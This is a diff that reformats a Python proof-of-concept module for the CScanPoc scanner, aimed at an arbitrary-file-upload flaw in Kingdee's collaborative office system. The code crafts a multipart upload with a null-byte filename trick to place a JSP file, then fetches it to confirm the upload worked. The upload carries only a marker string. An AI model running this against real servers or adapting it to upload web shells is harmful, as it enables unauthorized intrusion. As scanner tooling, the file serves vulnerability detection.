@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'kingdee_0011' # 平台漏洞编号，留空
+    vuln_id = 'kingdee_0011'  # 平台漏洞编号，留空
     name = '金蝶协同办公系统 任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         金蝶协同办公系统 /kingdee/document/upphoto_action.jsp 可上传任意文件。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '金蝶协同办公系统'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '74951df5-0499-4aa7-a978-7165d4499e1f'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             raw = '''
 POST /kingdee/document/upphoto_action.jsp HTTP/1.1
@@ -41,8 +43,9 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate
 '''
-            raw += "Referer: {}/kingdee/document/upphoto.jsp".format(self.target)
-            raw +='''
+            raw += "Referer: {}/kingdee/document/upphoto.jsp".format(
+                self.target)
+            raw += '''
 Cookie: JSESSIONID=abcHHjTI8tbcX9b1h5Ggv
 Connection: keep-alive
 Content-Type: multipart/form-data; boundary=---------------------------2984167512327
@@ -50,7 +53,8 @@ Content-Length: 219
 
 -----------------------------2984167512327
 '''
-            raw += "Content-Disposition: form-data; name=\"photo\"; filename=\"testvul.jsp" + chr(0) +".jpg\""
+            raw += "Content-Disposition: form-data; name=\"photo\"; filename=\"testvul.jsp" + \
+                chr(0) + ".jpg\""
             raw += '''
 Content-Type: image/jpeg
 
@@ -63,9 +67,10 @@ testvul_file_upload_test
             # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
             code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
             shell_path = '/kingdee/document/photo/testvul.jsp'
-            code2, head2, res2, errcode2, _url2 = hh.http(self.target + shell_path)
-            if code2 == 200 and 'testvul_file_upload_test' in res2: 
-                #security_hole(url)
+            code2, head2, res2, errcode2, _url2 = hh.http(
+                self.target + shell_path)
+            if code2 == 200 and 'testvul_file_upload_test' in res2:
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -74,6 +79,7 @@ testvul_file_upload_test
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
